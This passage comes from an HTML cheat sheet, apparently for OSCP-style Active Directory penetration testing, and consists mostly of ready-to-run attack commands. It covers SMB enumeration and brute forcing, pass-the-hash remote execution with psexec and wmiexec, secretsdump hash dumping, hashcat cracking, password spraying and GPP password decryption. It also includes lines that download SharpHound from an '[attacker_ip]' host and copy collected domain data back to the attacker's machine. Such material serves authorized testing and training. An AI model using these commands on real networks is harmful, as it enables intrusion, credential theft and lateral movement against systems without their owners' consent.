sudo ngrep -i -d &lt;INTERFACE&gt; &#39;s.?a.?m.?b.?a.*[[:digit:]]&#39; port 139

# Lists available SMB shares on the target
smbclient -L &lt;IP&gt;
</code></pre>
              <p><strong>SMB Enumeration with <code>smbmap</code></strong></p>
              <pre><code class="language-bash">smbmap -H &lt;IP&gt;
smbmap -u &#39;&#39; -p &#39;&#39; -H &lt;IP&gt;
smbmap -u &#39;guest&#39; -p &#39;&#39; -H &lt;IP&gt;
smbmap -u &#39;&#39; -p &#39;&#39; -H &lt;IP&gt; -R
</code></pre>
              <p><strong>SMB Enumeration with <code>crackmapexec</code></strong></p>
              <pre><code class="language-bash">crackmapexec smb &lt;IP&gt;
crackmapexec smb &lt;IP&gt; -u &#39;&#39; -p &#39;&#39;
crackmapexec smb &lt;IP&gt; -u &#39;guest&#39; -p &#39;&#39;
crackmapexec smb &lt;IP&gt; -u &#39;&#39; -p &#39;&#39; --shares
crackmapexec smb &lt;IP&gt; -u guest -p &quot;&quot; --rid-brute
crackmapexec smb &lt;IP&gt; -u &#39;[user]&#39; -p &#39;[password]&#39;
</code></pre>
              <p><strong>User Enumeration with <code>enum4linux</code></strong></p>
              <pre><code class="language-bash">enum4linux -a &lt;IP&gt;
enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;IP&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;IP&gt;

enum4linux -a -M -l -d &lt;ip&gt; 2&gt;&amp;1
enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;ip&gt;
enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;ip&gt;
enum4linux -a -u &quot;[user]&quot; -p &quot;[password]&quot; &lt;ip&gt;
</code></pre>
              <p><strong>SMB Client Operations</strong></p>
              <pre><code class="language-bash">smbclient --no-pass -L //&lt;ip&gt;
smbclient -L //&lt;ip&gt; -U [user]
smbclient //&lt;IP&gt;/&lt;SHARE&gt;
smbclient -N //&lt;IP&gt;/&lt;SHARE&gt;
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c &quot;prompt OFF;recurse ON;mget *&quot;
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c &quot;prompt OFF;recurse ON;mget *&quot; # Change the timeout to download big files

# Change the timeout to download big files
help timeout
timeout 100

# Other commands
prompt off
recurse on
mget *
</code></pre>
              <p><strong>Brute Force Credentials</strong></p>
              <pre><code class="language-bash">crackmapexec smb &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; smb://&lt;IP&gt; -u -vV
</code></pre>
              <p><strong>Mounting Shares</strong></p>
              <pre><code class="language-bash"># Mounts SMB shares to a local directory for further access and manipulation.
mkdir /tmp/share
sudo mount -t cifs //&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
sudo mount -t cifs -o &#39;username=&lt;USER&gt;,password=&lt;PASSWORD&gt;&#39; //&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
</code></pre>
              <p><strong>Execute Remote Commands</strong></p>
              <pre><code class="language-bash"># PsExec
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# WMIexec
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# SMBexec
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# AteExec
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; &lt;COMMAND&gt;
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
</code></pre>
              <p><strong>Exploitation (EternalBlue - MS17-010):</strong> <a
                  href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a>
              </p>
              <p><strong>PsExec</strong></p>
              <pre><code class="language-bash"># Credentials
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Pass the Hash
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# Testing with Crackmapexec
crackmapexec smb &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; --psexec
crackmapexec smb &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt; --psexec
</code></pre>
              <p><strong>WMIExec</strong></p>
              <pre><code class="language-bash"># Credentials
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Pass the Hash
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# Testing with Crackmapexec
crackmapexec wmiexec &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
crackmapexec wmiexec &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt;
</code></pre>
              <h4 id="215-winrm-enumeration-and-access-port-5985">2.1.5 WinRM Enumeration and Access (Port 5985)</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -p 5985,5986 --script winrm-info $IP
</code></pre>
              <p><strong>Test WinRM Access</strong>: use <strong>CME</strong> to test if WinRM is enabled:</p>
              <pre><code class="language-bash">crackmapexec winrm &lt;dc-ip&gt; -u &lt;username&gt; -p &lt;password&gt;
</code></pre>
              <p><strong>WinRM Login with Evil-WinRM</strong>: if valid credentials are found, log in via
                <strong>Evil-WinRM</strong>:
              </p>
              <pre><code class="language-bash">evil-winrm -i &lt;dc-ip&gt; -u &lt;username&gt; -p &lt;password&gt;
</code></pre>
              <p><strong>Crackmapexec</strong></p>
              <pre><code class="language-bash">crackmapexec winrm &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
</code></pre>
              <p><strong>Loggin In</strong></p>
              <pre><code class="language-powershell"># Using PowerShell to connect to WinRM
Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
</code></pre>
              <h3 id="22-basic-enumeration">2.2 Basic Enumeration</h3>
              <ul>
                <li>Recommended <strong>Methodology</strong>:</li>
              </ul>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/AD_Methodology.png" class="img-fluid" alt="Descripción de la imagen">
                  <figcaption class="figure-caption text-center">Active Directory Methodology</figcaption>
                </figure>
              </div>
              <ul>
                <li>Find my <strong>Domain SID</strong>:</li>
              </ul>
              <pre><code class="language-powershell"># Using PowerShell
(Get-ADDomain).DomainSID

# Using CMD
whoami /user

# Using vmic
wmic useraccount where name=&#39;[usernameToFind]&#39; get sid
</code></pre>
              <ul>
                <li>Find the <strong>name of my domain controller</strong> server:</li>
              </ul>
              <pre><code class="language-powershell"># Using PowerShell
Get-ADDomainController -Filter *

# Using nltest
nltest /dclist:[YourDomainName]

# Using netdom
netdom query dc

# Using nslookup
nslookup yourdomain.com

# Using ADUC
# Open ADUC --&gt; In the Domain Controllers Organizational Unit (OU), you can find the domain controllers listed there.
</code></pre>
              <ul>
                <li>Find <strong>Service Account Names</strong>:</li>
              </ul>
              <pre><code class="language-powershell"># Using PowerShell
# List All User Accounts with Service Principal Names (SPNs)
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
# Find Specific Service Accounts (e.g., SQL Server)
Get-ADUser -Filter {ServicePrincipalName -like &quot;*MSSQL*&quot;} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName

# Checking Running Services
Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -ne &quot;LocalSystem&quot; -and $_.StartName -ne &quot;LocalService&quot; -and $_.StartName -ne &quot;NetworkService&quot; } | Select-Object Name, StartName
or
sc queryex type= service

# Using nltest
nltest /domain_trusts

# Identify Specific Service Account by SPN
Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames

# Using ADUC
Open Active Directory Users and Computers and enable Advanced Features under the View menu. Browse to find service accounts.
</code></pre>
              <ul>
                <li><strong>Finding SPNs</strong>:</li>
              </ul>
              <pre><code class="language-bash"># PowerShell
  Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
  
  # Bash (Kali)
  ldapsearch -x -h &lt;DC_IP&gt; -b &quot;DC=domain,DC=com&quot; &quot;(&amp;(objectClass=computer)(servicePrincipalName=*))&quot; servicePrincipalName
  </code></pre>
              <ul>
                <li><strong>Check users</strong> of the domain:</li>
              </ul>
              <pre><code class="language-bash">net user /domain
net user [username] /domain
</code></pre>
              <ul>
                <li><strong>Check groups</strong> of the domain:</li>
              </ul>
              <pre><code class="language-bash">net groups /domain
net groups [groupName] /domain
</code></pre>
              <ul>
                <li><strong>Script</strong> to get the full LDAP path:</li>
              </ul>
              <pre><code class="language-powershell">$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]&#39;&#39;).distinguishedName 
$LDAP = &quot;LDAP://$PDC/$DN&quot;
</code></pre>
              <ul>
                <li><strong>Script</strong> to get full information for SAM account types:</li>
              </ul>
              <pre><code class="language-powershell">function Get-SAMInfo {
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DN = ([adsi]&#39;&#39;).distinguishedName 
  $LDAP = &quot;LDAP://$PDC/$DN&quot;
  $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
  $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
  $dirsearcher.filter = &quot;samAccountType=805306368&quot;
  $dirsearcher.FindAll() | ForEach-Object {
      $_.Properties
  }
}
</code></pre>
              <ul>
                <li><strong>Enumerate nested groups</strong> with custom LDAP query:</li>
              </ul>
              <pre><code class="language-powershell">$group = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=[GroupName]))&quot;
</code></pre>
              <ul>
                <li><strong>Encapsulate LDAP search into a function</strong>:</li>
              </ul>
              <pre><code class="language-powershell">function LDAPSearch {
  param ([string]$LDAPQuery)
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DistinguishedName = ([adsi]&#39;&#39;).distinguishedName
  $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://$PDC/$DistinguishedName&quot;)
  $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
  return $DirectorySearcher.FindAll()
}
</code></pre>
              <ul>
                <li><strong>Perform user search</strong> using LDAP query:</li>
              </ul>
              <pre><code class="language-powershell">LDAPSearch -LDAPQuery &quot;(samAccountType=805306368)&quot;
</code></pre>
              <ul>
                <li><strong>Search for all possible groups</strong> in AD:</li>
              </ul>
              <pre><code class="language-powershell">LDAPSearch -LDAPQuery &quot;(objectclass=group)&quot;
</code></pre>
              <ul>
                <li><strong>Iterate through objects in <code>$group</code> variable</strong>:</li>
              </ul>
              <pre><code class="language-powershell">foreach ($group in $(LDAPSearch -LDAPQuery &quot;(objectCategory=group)&quot;)) {
  $group.Properties | Select-Object {$_.cn}, {$_.member}
}
</code></pre>
              <h3 id="23-powerview">2.3 PowerView</h3>
              <p><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank"><strong>Download
                    PowerView.ps1</strong></a></p>
              <ul>
                <li><strong>Import PowerView</strong> (ensure it is downloaded first):</li>
              </ul>
              <pre><code class="language-powershell">Import-Module .\PowerView.ps1
</code></pre>
              <ul>
                <li><strong>Domain information</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetDomain
</code></pre>
              <ul>
                <li>Find <strong>Domain Name</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-ADDomainController -Discover
</code></pre>
              <ul>
                <li>Get Domain User</li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser
</code></pre>
              <ul>
                <li><strong>Users information</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser | Select-Object [attributes]
</code></pre>
              <ul>
                <li><strong>Groups information</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetGroup | Select-Object [attributes]
</code></pre>
              <ul>
                <li><strong>Operating System information</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetComputer | Select-Object [attributes]
</code></pre>
              <ul>
                <li>Get <strong>Domain Admins</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetGroup -GroupName &quot;Domain Admins&quot;
</code></pre>
              <ul>
                <li>Find <strong>Kerberoastable Accounts</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser -SPN
</code></pre>
              <ul>
                <li><strong>Enumerate Domain Controllers</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetDomainController
</code></pre>
              <ul>
                <li><strong>Find Shares</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetShare
</code></pre>
              <ul>
                <li>Check for <strong>Delegation</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser -Delegation
</code></pre>
              <h3 id="24-service-principal-names-spn-enumeration">2.4 Service Principal Names (SPN) Enumeration</h3>
              <ul>
                <li><strong>List SPN linked to a user</strong>:</li>
              </ul>
              <pre><code class="language-bash">setspn -L [service]
</code></pre>
              <ul>
                <li><strong>List SPN accounts in the domain</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
</code></pre>
              <h3 id="25-object-permissions-enumeration">2.5 Object Permissions Enumeration</h3>
              <ul>
                <li>
                  <p><strong>Active Directory permission types</strong>:</p>
                  <ul>
                    <li><code>GenericAll</code>: Full permissions</li>
                    <li><code>GenericWrite</code>: Edit certain attributes</li>
                    <li><code>WriteOwner</code>: Change ownership</li>
                    <li><code>WriteDACL</code>: Edit ACEs applied</li>
                    <li><code>AllExtendedRights</code>: Change/reset password, etc.</li>
                    <li><code>ForceChangePassword</code>: Force password change</li>
                    <li><code>Self</code>: Add self to groups</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Run <code>Get-ObjectAcl</code> (PowerView)</strong> to specify user:</p>
                </li>
              </ul>
              <pre><code class="language-powershell">Get-ObjectAcl -Identity [username]
</code></pre>
              <ul>
                <li><strong>Convert Object SID to a name</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Convert-SidToName [SID]
</code></pre>
              <ul>
                <li><strong>Enumerate ACLs for a group</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-ObjectAcl -Identity &quot;[GroupName]&quot; | Where-Object { $_.ActiveDirectoryRights -eq &quot;GenericAll&quot; } | Select-Object SecurityIdentifier, ActiveDirectoryRights
</code></pre>
              <ul>
                <li><strong>Convert SIDs with GenericAll permission to names</strong>:</li>
              </ul>
              <pre><code class="language-powershell">&quot;[SID1]&quot;, &quot;[SID2]&quot; | Convert-SidToName
</code></pre>
              <ul>
                <li><strong>Add yourself to a domain group</strong>:</li>
              </ul>
              <pre><code class="language-bash">net group &quot;[GroupName]&quot; [username] /add /domain
</code></pre>
              <ul>
                <li><strong>Verify group membership</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetGroup &quot;[GroupName]&quot; | Select-Object member
</code></pre>
              <h3 id="26-domain-shares-enumeration">2.6 Domain Shares Enumeration</h3>
              <ul>
                <li><strong>Find domain shares (PowerView)</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Find-DomainShare
</code></pre>
              <ul>
                <li><strong>Decrypt GPP password using gpp-decrypt</strong>:</li>
              </ul>
              <pre><code class="language-bash">gpp-decrypt [encrypted_password]
</code></pre>
              <h3 id="27-bloodhound--sharphound">2.7 BloodHound &amp; SharpHound</h3>
              <p>BloodHound is a tool for Active Directory (AD) enumeration and privilege escalation, designed to help
                visualize AD relationships and identify paths for lateral movement and privilege escalation.</p>
              <p>Resources:</p>
              <ul>
                <li><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">SharpHound.ps1</a>
                </li>
                <li><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">SharpHound.exe</a>
                </li>
              </ul>
              <ol>
                <li><strong>Download and Transfer SharpHound</strong>:</li>
              </ol>
              <pre><code class="language-powershell"># Download the PowerShell version of SharpHound
Invoke-WebRequest -Uri &quot;http://[attacker_ip]/sharphound.ps1&quot; -OutFile &quot;C:\Temp\sharphound.ps1&quot;

# Alternatively, you can download the .exe version
Invoke-WebRequest -Uri &quot;http://[attacker_ip]/sharphound.exe&quot; -OutFile &quot;C:\Temp\sharphound.exe&quot;
</code></pre>
              <ol start="2">
                <li><strong>Running SharpHound</strong></li>
                <ul>
                  <li>Find your <strong>Domain Name</strong>:</li>
                  <pre><code class="language-powershell"># Find your domain name
nltest /dclist:domainname
or
Get-ADDomainController -Discover

# Run SharpHound to collect domain data (using the .exe)
.\SharpHound.exe -c All
or
.\SharpHound.exe -c All -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -f AllData</code></pre>
                  <li>Using the <strong>PowerShell Script</strong>:</li>
                  <pre><code class="language-powershell"># Import the SharpHound script into memory
Import-Module .\SharpHound.ps1

# Collect all data from the domain
Invoke-BloodHound -CollectionMethod All -Domain &lt;domain&gt; -OutputDirectory C:\Temp</code></pre>
                  <li>Collect <strong>Specific Methods</strong>: run only specific collection tasks instead
                    of <code>All</code> to limit the data gathered.</li>
                  <pre><code class="language-powershell">Invoke-BloodHound -CollectionMethod Group
Invoke-BloodHound -CollectionMethod ACL</code></pre>
                </ul>
              </ol>
              <ol start="3">
                <li><strong>Transfer Collected Data to Kali</strong>: once SharpHound finishes collecting, transfer the
                  output <code>.zip</code> file from <code>C:\Temp</code> back to your Kali machine. You can use one of
                  the methods below or check Section 15 for additional transfer methods.</li>
              </ol>
              <pre><code class="language-bash"># Having an Evil-WinRM session
download [bloodhound_file].zip

# SCP from the victim to your Kali
scp user@victim-ip:C:\Temp\*.zip /path/to/your/dir

# Download via a web server
Invoke-WebRequest -Uri &quot;http://your-kali-ip/upload/path&quot; -OutFile &quot;C:\Temp\*.zip&quot;
</code></pre>
              <ol start="4">
                <li><strong>Running BloodHound on Kali</strong>: access the Neo4j interface at
                  <code>https://localhost:7474</code> and log in with default credentials <code>neo4j:neo4j</code> or
                  <code>neo4j:Neo4j</code>.
                </li>
              </ol>
              <pre><code class="language-bash"># Start the Neo4j service in Kali (needed for analyzing the collected data):
sudo neo4j start
</code></pre>
              <ol start="5">
                <li><strong>Start BloodHound</strong>:</li>
              </ol>
              <pre><code class="language-bash">bloodhound
</code></pre>
              <ol start="6">
                <li>
                  <p><strong>Import the .zip files</strong> collected from the victim machine into BloodHound for
                    analysis.</p>
                </li>
                <li>
                  <p><strong>Analyze</strong> the domain data:</p>
                  <ul>
                    <li>Use queries like <em>Find all Domain Admins</em> or <em>Find Shortest Paths to Domain
                        Admins</em>.</li>
                    <li>Find computers vulnerable to <strong>Unconstrained Delegation</strong>.</li>
                    <li><strong>Mark nodes as owned</strong> to find potential escalation paths.</li>
                    <li>Set <strong>Node Label Display</strong> to <strong>Always Display</strong> in the settings for
                      better visibility.</li>
                    <li>Identify <strong>Kerberoastable accounts</strong>.</li>
                    <li>Find potential GPOs to abuse: if BloodHound indicates that a user or group has
                      <code>WriteGPO</code>, <code>OwnsGPO</code>, or <code>GPO control</code> over a GPO linked to
                      important OUs (especially those affecting privileged accounts), this is a strong indicator to use
                      SharpGPOAbuse to escalate privileges or perform lateral movement.
                    </li>
                  </ul>
                </li>
                <li>
                  <p><strong>Manual Commands</strong>:</p>
                  <ul>
                    <li>Format for cypher: <code>(NODES)-[:RELATIONSHIP]-&gt;(NODES)</code></li>
                    <li>All computers in domain: <code>MATCH (m:Computer) RETURN m</code></li>
                    <li>All Users in domain: <code>MATCH (m:User) RETURN m</code></li>
                    <li>Get active sessions: <code>MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p</code>
                    </li>
                    <li>Enumerate users with <code>SQLAdmin</code>:
                      <code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2</code>
                    </li>
                    <li>Enumerate users with <code>CanPSRemote</code>:
                      <code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2</code>
                    </li>
                  </ul>
                </li>
              </ol>
              <h3 id="28-extracting-and-cracking-password-hashes">2.8 Extracting and Cracking Password Hashes</h3>
              <ol>
                <li><strong>Dump Hashes with SecretsDump</strong>: use <strong>SecretsDump</strong> to extract NTDS.dit
                  or password hashes.</li>
              </ol>
              <pre><code class="language-bash">secretsdump.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;dc-ip&gt;
</code></pre>
              <ol start="2">
                <li><strong>Crack NTLM Hashes</strong>: once you have the hashes, crack them with
                  <strong>Hashcat</strong> or <strong>John the Ripper.</strong>
                </li>
              </ol>
              <pre><code class="language-bash">hashcat -m 1000 ntlm-hashes.txt rockyou.txt
</code></pre>
              <ol start="3">
                <li><strong>Password Spraying</strong>: involves testing common passwords across many accounts to avoid
                  account lockouts. CrackMapExec is ideal for this.</li>
              </ol>
              <pre><code class="language-bash">crackmapexec smb &lt;dc-ip&gt; -u usernames.txt -p password123 --spray
</code></pre>
              <h3 id="29-ms-rprn-print-spooler-service-exploitation">2.9 MS-RPRN Print Spooler Service Exploitation
              </h3>
              <p>The <strong>Print Spooler service</strong> has been linked to critical vulnerabilities,
                notably <strong>CVE-2021-34527</strong> (PrintNightmare). This vulnerability allows attackers to execute
                arbitrary code remotely with SYSTEM privileges due to improper handling of requests.</p>
              <p><strong>Enumerate Printers</strong>: if Print Spooler service is enabled, enumerate available printers.
              </p>
              <pre><code class="language-bash">rpcclient -U &quot;&lt;user&gt;%&lt;password&gt;&quot; &lt;dc-ip&gt; --command=&quot;enumprinters&quot;
</code></pre>
              <h3 id="210-common-spns-for-service-accounts">2.10 Common SPNs for Service Accounts</h3>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>SPN</th>
                    <th>Name</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><code>cifs</code></td>
                    <td>Common Internet File System</td>
                  </tr>
                  <tr>
                    <td><code>dcom</code></td>
                    <td>Distributed Component Object Model</td>
                  </tr>
                  <tr>
                    <td><code>exchange</code></td>
                    <td>Microsoft Exchange Server</td>
                  </tr>
                  <tr>
                    <td><code>ftp</code></td>
                    <td>File Transfer Protocol</td>
                  </tr>
                  <tr>
                    <td><code>http</code></td>
                    <td>Hypertext Transfer Protocol</td>
                  </tr>
                  <tr>
                    <td><code>imap</code></td>
                    <td>Internet Message Access Protocol</td>
                  </tr>
                  <tr>
                    <td><code>krbtgt</code></td>
                    <td>Kerberos Ticket Granting Ticket</td>
                  </tr>
                  <tr>
                    <td><code>ldap</code></td>
                    <td>Lightweight Directory Access Protocol</td>
                  </tr>
                  <tr>
                    <td><code>mssql</code></td>
                    <td>Microsoft SQL Server</td>
                  </tr>
                  <tr>
                    <td><code>mysql</code></td>
                    <td>MySQL Database</td>
                  </tr>
                  <tr>
                    <td><code>nfs</code></td>
                    <td>Network File System</td>
                  </tr>
                  <tr>
                    <td><code>oracle</code></td>
                    <td>Oracle Database</td>
                  </tr>
                  <tr>
                    <td><code>pgsq</code></td>
                    <td>PostgreSQL Database</td>
                  </tr>
                  <tr>
                    <td><code>pop3</code></td>
                    <td>Post Office Protocol 3</td>
                  </tr>
                  <tr>
                    <td><code>rpc</code></td>
                    <td>Remote Procedure Call</td>
                  </tr>
                  <tr>
                    <td><code>smtp</code></td>
                    <td>Simple Mail Transfer Protocol</td>
                  </tr>
                  <tr>
                    <td><code>svc</code></td>
                    <td>Service</td>
                  </tr>
                  <tr>
                    <td><code>termsrv</code></td>
                    <td>Terminal Server</td>
                  </tr>
                  <tr>
                    <td><code>wsman</code></td>
                    <td>Windows Remote Management</td>
                  </tr>
                </tbody>
              </table>
              <h3 id="211-gpp-passwords-abuse-group-policy-preferences">2.11 GPP Passwords Abuse (Group Policy
                Preferences)</h3>
              <h4 id="2111-gpp-main-method-for-extraction">2.11.1 GPP Main Method for Extraction</h4>
              <p><strong>Search for GPP Passwords in SYSVOL</strong>: access SYSVOL share and search for Group Policy
                Preferences (GPP) files; this happens because a common useful misconfiguration found in modern domain
                environments is unprotected Windows GPP settings files</p>
              <ol>
                <li><strong>Map the DC SYSVOL</strong> share:</li>
              </ol>
              <pre><code class="language-powershell">net use z:\\[hostname/domain]\SYSVOL
</code></pre>
              <ol start="2">
                <li><strong>Find the GPP file</strong>: usually the one called <code>Groups.xml</code>: the file is
                  usually located in a path similar to this one
                  <code>\hostname.domain\Policies\{00000000–0000–0000–0000–00000000000}\MACHINE\Preferences\Groups\Groups.xml</code>.
                </li>
              </ol>
              <pre><code class="language-powershell">dir /s Groups.xml

type Groups.xml
</code></pre>
              <ol start="3">
                <li><strong>Decrypt the Found <code>Hash</code> / <code>cpassword</code></strong>:</li>
              </ol>
              <pre><code class="language-bash">gpp-decrypt [gpp_hash/cpassword]

# Example
gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
sup3r53cr3tGP0pa55
</code></pre>
              <ol start="4">
                <li><strong>(Optional) Alternative Method</strong>:</li>
              </ol>
              <pre><code class="language-bash"># Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
dir \\\\&lt;domain&gt;\\SYSVOL\\&lt;domain&gt;\\Policies\\ /s /b | findstr cpassword

# Look for Groups.xml files which might contain cleartext passwords.
smbclient //dc-ip/SYSVOL -U &quot;domain\username&quot;
</code></pre>
              <h4 id="2112-impacket-get-gpppassword">2.11.2 Impacket-Get-GPPPassword</h4>
              <p><code>Impacket-Get-GPPPassword</code> (<code>Get-GPPPassword.py</code>) is an Impacket script for
                retrieving GPP passwords. There are several methods for using this script depending on the level of
                access you have:</p>
              <ul>
                <li><strong>NULL Session</strong>: this command attempts to retrieve GPP passwords without providing any
                  credentials (NULL session). Useful if anonymous access is allowed on the target Domain Controller
                  (DC).</li>
              </ul>
              <pre><code class="language-bash">Get-GPPPassword.py -no-pass &#39;[DOMAIN_CONTROLLER]&#39;
</code></pre>
              <ul>
                <li><strong>With Cleartext Credentials</strong>: uses cleartext credentials (username and password) to
                  access and retrieve stored GPP passwords from the DC.</li>
              </ul>
              <pre><code class="language-bash">Get-GPPPassword.py &#39;[DOMAIN]&#39;/&#39;[USER]&#39;:&#39;[PASSWORD]&#39;@&#39;[DOMAIN_CONTROLLER]&#39;
</code></pre>
              <ul>
                <li><strong>Pass-the-Hash (with NT hash)</strong>: executes a pass-the-hash attack with the user&rsquo;s
                  NTLM
                  hash instead of a password, allowing retrieval of GPP passwords.</li>
              </ul>
              <pre><code class="language-bash">Get-GPPPassword.py -hashes :&#39;[NThash]&#39; &#39;[DOMAIN]&#39;/&#39;[USER]&#39;:&#39;[PASSWORD]&#39;@&#39;[DOMAIN_CONTROLLER]&#39;
</code></pre>
              <ul>
                <li><strong>Parsing a Local File</strong>: this command parses a local Policy XML file for stored
                  passwords. Useful if you have a downloaded or extracted policy file on your machine.</li>
              </ul>
              <pre><code class="language-bash">Get-GPPPassword.py -xmlfile &#39;/path/to/Policy.xml&#39; &#39;LOCAL&#39;
</code></pre>
              <h4 id="2113-smb-share-sysvol">2.11.3 SMB Share-SYSVOL</h4>
              <p>SYSVOL is a shared folder on the DC where Group Policy objects (GPOs) and scripts are stored. This
                folder is often accessible to any domain user, allowing attackers to potentially access configuration
                files with stored passwords (GPP).</p>
              <ol>
                <li><strong>Download the Entire Share</strong>: you can use a tool or script to download the entire
                  SYSVOL share for offline analysis.</li>
              </ol>
              <pre><code class="language-bash"># Reference to a script for downloading files in SYSVOL
https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
</code></pre>
              <ol start="2">
                <li><strong>Navigate to Downloaded Files</strong>: this command searches through the downloaded files
                  for instances of <code>cpassword</code> (encrypted passwords stored in the XML files), helping
                  identify where passwords are stored.</li>
              </ol>
              <pre><code class="language-bash">grep -inr &quot;cpassword&quot;
</code></pre>
              <h4 id="2114-crackmapexec">2.11.4 CrackMapExec</h4>
              <p>CrackMapExec is a popular tool for SMB enumeration and exploitation. Here, it is used to locate GPP
                passwords.</p>
              <ul>
                <li><strong>With Username and Password</strong>: this command scans one or multiple targets to identify
                  stored GPP passwords using cleartext credentials.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb &lt;TARGET[s]&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; -M gpp_password
</code></pre>
              <ul>
                <li><strong>With NTLM Hash</strong>: this variant allows pass-the-hash authentication with NT and LM
                  hashes instead of a password.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb &lt;TARGET[s]&gt; -u &lt;USERNAME&gt; -H LMHash:NTLMHash -d &lt;DOMAIN&gt; -M gpp_password
</code></pre>

